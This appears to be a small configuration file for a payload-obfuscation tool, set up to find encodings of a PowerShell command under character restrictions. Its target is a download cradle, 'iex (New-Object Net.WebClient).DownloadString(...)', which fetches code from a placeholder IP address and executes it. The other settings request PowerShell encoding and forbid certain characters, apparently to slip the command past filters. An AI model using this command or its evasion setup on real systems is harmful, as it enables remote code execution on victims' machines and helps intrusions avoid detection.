variants = { "ip": IPVariants("10.0.0.1") }

target = "iex (New-Object Net.WebClient).DownloadString('http://%(ip)s')"

encode = PowerShellEncode
judge = ForbiddenCharacters("zZyY=")

magic_spaces = 3
want_all_solutions = True
